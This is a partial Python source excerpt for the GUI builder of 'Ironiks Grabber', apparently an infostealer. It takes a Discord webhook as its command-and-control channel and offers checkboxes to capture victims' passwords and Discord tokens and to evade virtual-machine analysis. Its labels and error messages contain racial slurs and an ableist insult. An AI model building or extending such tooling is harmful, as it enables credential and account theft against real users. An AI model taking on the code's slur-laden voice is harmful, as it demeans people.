...
class BuilderOptionsFrame(ctk.CTkFrame):
	...
	def __init__(self, master) -> None:
		...
		self.C2EntryControl = ctk.CTkEntry(self, placeholder_text= "Put Your Webhook Here For Daddy Ironik", height= 38, font= self.font, text_color= "white")
		self.C2EntryControl.grid(row= 0, column= 0, sticky= "ew", padx= (15, 5), columnspan= 5)

		self.testC2ButtonControl = ctk.CTkButton(self, text= "Test yo shit", height= 38, font= self.font, fg_color= "#454545", hover_color= "#4D4D4D", text_color_disabled= "grey", command= lambda: Thread(target= self.testC2ButtonControl_Callback).start())
		self.testC2ButtonControl.grid(row= 0, column= 5, sticky= "ew", padx = (5, 15))
		
		self.pingMeCheckboxControl = ctk.CTkCheckBox(self, text= "Ping yo ass", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.pingMeVar)
		self.pingMeCheckboxControl.grid(row= 1, column= 0, sticky= "w", padx= 20)

		self.vmProtectCheckboxControl = ctk.CTkCheckBox(self, text= "so these niggas cant use vm", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.vmProtectVar)
		...
		self.capturePasswordsCheckboxControl = ctk.CTkCheckBox(self, text= "THEIR FUCKING PASSWORDS!", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.capturePasswordsVar)
		...
		self.captureDiscordTokensCheckboxControl = ctk.CTkCheckBox(self, text= "discord tokens bbg", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureDiscordTokensVar)
	...
	def buildButtonControl_Callback(self) -> None:
		if self.C2Mode == 0:
			...
			if len(webhook) == 0:
				messagebox.showerror("Error", "Nigga your webhook cant be empty")
				return
			
			if any(char.isspace() for char in webhook):
				messagebox.showerror("Error", "are you retarded webhook cant contain spaces")
				return
...
class Builder(ctk.CTk):
	...
	def __init__(self) -> None:
		...
		self.titleLabel = ctk.CTkLabel(self, text= "Ironiks Grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
